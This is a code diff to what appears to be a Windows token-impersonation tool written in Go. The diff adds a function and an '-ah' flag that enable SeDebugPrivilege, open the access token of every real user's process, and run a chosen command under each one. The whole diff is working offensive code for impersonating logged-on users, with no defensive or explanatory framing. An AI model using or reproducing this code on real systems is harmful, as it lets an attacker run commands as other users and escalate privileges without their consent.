@@ -444,6 +444,26 @@ func tryDuplicateTokenForUser(targetUser, command string) {
 	log.Printf("[-] Failed to duplicate token for user: %s\n", targetUser)
 }
 
+func tryDuplicateTokenForAllRealUsers(command string) {
+	enableSeDebugPrivilege()
+	processes := getAllProcesses()
+	handledUsers := make(map[string]bool)
+	for _, p := range processes {
+		if isRealUser(p.UserName) && !handledUsers[p.UserName] {
+			handledUsers[p.UserName] = true
+			ProcessHandle := handleProcess(p.PID)
+			var TokenHandle windows.Token
+			err := windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &TokenHandle)
+			if err != nil {
+				log.Printf("[-] OpenProcessToken() error for PID %d: %v\n", p.PID, err)
+				continue
+			}
+			runAsToken(TokenHandle, windows.StringToUTF16Ptr(command))
+			TokenHandle.Close()
+		}
+	}
+}
+
 func main() {
 	username, isElevated := getUserInfo()
 	if isElevated {
@@ -458,12 +478,14 @@ func main() {
 	var list bool
 	var tokens bool
 	var userNameFlag string
+	var allHuman bool
 
 	flag.IntVar(&pid, "p", 0, "Target Process PID.")
 	flag.StringVar(&command, "c", "Aquilao", "Execute Command.")
 	flag.BoolVar(&list, "l", false, "List all processes with their tokens")
 	flag.BoolVar(&tokens, "t", false, "List available unique tokens in system")
 	flag.StringVar(&userNameFlag, "u", "", "Target username.")
+	flag.BoolVar(&allHuman, "ah", false, "Use all real user tokens to run the specified command.")
 	flag.Parse()
 
 	if tokens {
@@ -475,6 +497,11 @@ func main() {
 
 	if list {
 		listProcesses()
+		return
+	}
+
+	if allHuman && command != "Aquilao" {
+		tryDuplicateTokenForAllRealUsers(command)
 		return
 	}
 
